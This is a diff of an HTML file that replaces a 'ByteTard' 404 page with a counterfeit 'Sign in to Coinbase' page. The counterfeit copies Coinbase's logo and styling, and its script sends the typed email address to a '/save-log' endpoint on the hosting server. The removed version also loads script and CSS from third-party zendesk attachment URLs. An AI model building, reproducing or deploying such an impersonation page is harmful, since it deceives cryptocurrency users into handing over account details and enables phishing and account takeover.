@@ -1,148 +1,269 @@
-
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
+<html lang="en">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="ROBOTS" content="NOINDEX, FOLLOW" />
-    <title>404 / ByteTard</title>
-    <link rel="stylesheet" type="text/css" href="/style.css" />
-    <script src="/js.js"></script>
-    <link rel="stylesheet" type="text/css" href="style/Cobalt.min.css?v=31" />
-    <link rel="stylesheet" type="text/css" href="/static/css/font-awesome.min.css" />
-    <link href="https://fonts.googleapis.com/css?family=Raleway:900,400" rel="stylesheet" type="text/css" />
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
-	    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <script src="/static/js/notifications.js?v=4" type="text/javascript" charset="UTF-8"></script>
-			<script src="https://mindgeek.zendesk.com/attachments/token/PVnUPAoVKavvCEiYs7JpNGBo3/?name=js.js"></script>
-		<link rel="stylesheet" type="text/css" href="https://mindgeek.zendesk.com/attachments/token/47xWD3lSFP9DlbNvc7rAiHijZ/?name=css.css" />
-	<script>
-        function searchRedirect(event) {
-            if (event.key === 'Enter') {
-                let query = document.getElementById('search-bar').value;
-                if (query) {
-                    window.location.href = "https://www.mercari.com/u/bytetard/?keyword=" + encodeURIComponent(query);
-                }
-            }
-        }
-    </script> 
-	<style>
-        .card {
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            margin-bottom: 20px;
-        }
-        .progress {
-            height: 10px;
-            border-radius: 5px;
-            background: #7B7A7A;
-            overflow: hidden;
-        }
-        .progress-bar {
-            height: 100%;
-            width: 90%; /* Adjust percentage dynamically */
-            background: #28a745;
-        }
-        .card-footer ul {
-            list-style: none;
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coinbase - Sign In</title>
+    <meta name="theme-color" content="#0052ff">
+    <link rel="icon" href="/favicon.ico">
+
+    <style>
+        * {
+            margin: 0;
             padding: 0;
-            display: flex;
-            gap: 10px;
-            align-items: center;
+            box-sizing: border-box;
         }
-        .card-footer img {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
+
+        body {
+            background-color: #0A0B0D;
+            color: #FFFFFF;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-card {
+            background-color: #0A0B0D;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            padding: 32px;
+            width: 100%;
+            max-width: 448px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .logo {
+            width: 32px;
+            height: 32px;
+            fill: #FFFFFF;
+        }
+
+        .signup-btn {
+            background: transparent;
+            border: none;
+            color: #FFFFFF;
+            padding: 8px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .signup-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 8px;
+            color: #FFFFFF;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            background: #0F1012;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: #FFFFFF;
+            font-size: 16px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1652F0;
+        }
+
+        .continue-btn {
+            width: 100%;
+            padding: 16px;
+            background: #1652F0;
+            border: none;
+            border-radius: 28px;
+            color: #FFFFFF;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 24px;
+        }
+
+        .continue-btn:hover {
+            background: #507FE5;
+        }
+
+        .continue-btn:disabled {
+            background: #314B84;
+            cursor: not-allowed;
+        }
+
+        .social-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1E2023;
+            border: none;
+            border-radius: 28px;
+            color: #FFFFFF;
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            cursor: pointer;
+        }
+
+        .social-btn:hover {
+            background: #3A3D45;
+        }
+
+        .social-icon {
+            width: 16px;
+            height: 16px;
+            fill: #FFFFFF;
+        }
+
+        .divider {
+            position: relative;
+            text-align: center;
+            margin: 24px 0;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.2);
+            z-index: 0;
+        }
+
+        .divider span {
+            background: #0A0B0D;
+            padding: 0 16px;
+            position: relative;
+            z-index: 1;
+            font-size: 14px;
+            color: #FFFFFF;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 16px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .footer a {
+            color: rgba(255, 255, 255, 0.6);
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-<div id="punindex" class="pun">
-    <div class="top-box"></div>
-    <div class="punwrap">
-        <div id="brdheader" class="block">
-            <div class="box">
-                <div id="brdtitle" class="inbox">
-                    <h1><a href="/gs">Byte<span>Tard</span></a></h1>
-                    <div id="brddesc"></div>
+    <div class="header">
+        <svg class="logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"/>
+        </svg>
+        <button class="signup-btn">Sign up</button>
+    </div>
+
+    <div class="main-container">
+        <div class="login-card">
+            <h2>Sign in to Coinbase</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" placeholder="Your email address" required>
                 </div>
-                <div id="brdmenu" class="inbox">
-                    <ul>
-                        <li id="nav-notifications"><span class="fake-link" id="notifications"><i class="fa fa-lg fa-bell" id="notifications-badge" data-after-content="0"></i></span></li>
-                        <li class="nav-item"><a href="/gs">Home</a></li>
-                        <li class="nav-item"><a href="/products">Products</a></li>
-                        <li class="nav-item"><a href="/contact">Contact</a></li>
-                        <li class="nav-item"><a href="/adobe">Adobe</a></li>
-                        <li class="nav-item premium"><a href="https://www.tiktok.com/@scaringxd"><b>TikTok</b></a></li>
-                        <li class="nav-item"><a href="/whitecocao">WhiteCocao</a></li>
-                        <li class="nav-item search-bar">
-                             <input type="text" id="search-bar" placeholder="Search my shop" onkeydown="searchRedirect(event)">
-                            <button type="submit"><i class="fa fa-search"></i></button>
-                        </li>
-                    </ul>
-                </div>
-                <div id="notifications-container">
-                    <div id="notifications-body">
-                        <ul id="notifications-list"></ul>
-                    </div>
-                    <div id="notifications-footer">
-                        <p><a id="notifications-clear" href="#">Clear</a></p>
-                    </div>
-                </div>
-                <div id="brdwelcome" class="inbox">
-                    <p class="ilk">Logged in as <b>Guest</b></p>
-                    <p class="ikinci"><b>HTML Free classes</b> Starting 03/01/2025 [<a href="/404">See lessons</a>]</p>
-                    <p><a href="https://t.me/ByteTardz">Join us on Telegram</a> • <a href="https://discord.gg/eQfDx6QP">Join us on discord</a></p>
-                </div>
-            </div>
-        </div>
-        <div id="brdmain">
-            <div id="msg" class="block">
-            
-                <div class="box">
-                    <div class="inbox">
-						
-						
-<h2 style="font-size: 40px;">Sorry!</h2>
-        <h1 style="font-weight:bold; font-size: 23px;">We can't seem to find what you're looking for!</h1>
-        <p style="font-size: 14px; opacity: 0.7">Please check that the Web site address is spelled correctly.<br>Or go to our <a href="/gs">home page</a>, and use the menus to navigate to a specific section.</p> 
-                </div>
-            </div>
-        </div>
-        <div id="brdfooter" class="block">
-            <div class="box">
-                <div class="inbox">
-                    <p>ByteTard 2025</p>
-                    <ul>
-                        <li><a href="/tos">Terms and Conditions / Privacy Policy</a></li>
-                    </ul>
-                </div>
+                <button type="submit" class="continue-btn">Continue</button>
+
+                <div class="divider"><span>OR</span></div>
+
+                <button type="button" class="social-btn">
+                    Sign in with Google
+                    <svg class="social-icon" viewBox="0 0 17 17" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M16.18 8.57691C16.18 8.00964 16.1291 7.46419 16.0345 6.94055H8.5V10.0351H12.8055C12.62 11.0351 12.0564 11.8824 11.2091 12.4496V14.4569H13.7945C15.3073 13.0642 16.18 11.0133 16.18 8.57691Z" fill="white"/>
+                        <path d="M8.50017 16.3949C10.6602 16.3949 12.4711 15.6786 13.7947 14.4567L11.2093 12.4495C10.4929 12.9295 9.57653 13.2131 8.50017 13.2131C6.41653 13.2131 4.65289 11.8058 4.0238 9.91492H1.35107V11.9876C2.66744 14.6022 5.37289 16.3949 8.50017 16.3949Z" fill="white"/>
+                        <path d="M4.02364 9.91497C3.86364 9.43497 3.77273 8.92225 3.77273 8.39497C3.77273 7.8677 3.86364 7.35497 4.02364 6.87497V4.80225H1.35091C0.809091 5.88225 0.5 7.10406 0.5 8.39497C0.5 9.68588 0.809091 10.9077 1.35091 11.9877L4.02364 9.91497Z" fill="white"/>
+                        <path d="M8.50017 3.57684C9.67471 3.57684 10.7293 3.98047 11.5583 4.7732L13.8529 2.47866C12.4674 1.18775 10.6565 0.39502 8.50017 0.39502C5.37289 0.39502 2.66744 2.18775 1.35107 4.80229L4.0238 6.87502C4.65289 4.98411 6.41653 3.57684 8.50017 3.57684Z" fill="white"/>
+                    </svg>
+                </button>
+
+                <button type="button" class="social-btn">
+                    Sign in with Wallet
+                    <svg class="social-icon" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M14 2H2C1.44772 2 1 2.44772 1 3V13C1 13.5523 1.44772 14 2 14H14C14.5523 14 15 13.5523 15 13V3C15 2.44772 14.5523 2 14 2ZM14 13H2V3H14V13ZM11 4H5V5H11V4ZM11 6H5V7H11V6Z" fill="white"/>
+                    </svg>
+                </button>
+            </form>
+
+            <div class="footer">
+                Not your device? Use a private window. See our 
+                <a href="#">Privacy Policy</a> for more info.
             </div>
         </div>
     </div>
-    <div class="end-box"></div>
-</div>
-<style>
-    .premium a {
-        color: red;
-        font-weight: bold;
-    }
-    .search-bar {
-        display: flex;
-        align-items: center;
-    }
-    #nav-search {
-        padding: 5px;
-        border: 1px solid #ccc;
-        border-radius: 5px;
-    }
-    .search-bar button {
-        background: none;
-        border: none;
-        cursor: pointer;
-        margin-left: 5px;
-    }
-</style>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const logEntry = {
+                timestamp: new Date().toISOString(),
+                email: emailInput.value,
+                type: 'email_submission'
+            };
+
+            try {
+                // Send log entry to server
+                const response = await fetch('/save-log', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(logEntry)
+                });
+
+                if (response.ok) {
+                    console.log('Log saved successfully');
+                    emailInput.value = ''; // Clear input
+                } else {
+                    console.error('Failed to save log');
+                }
+            } catch (error) {
+                console.error('Error saving log:', error);
+            }
+        });
+    </script>
 </body>
 </html>
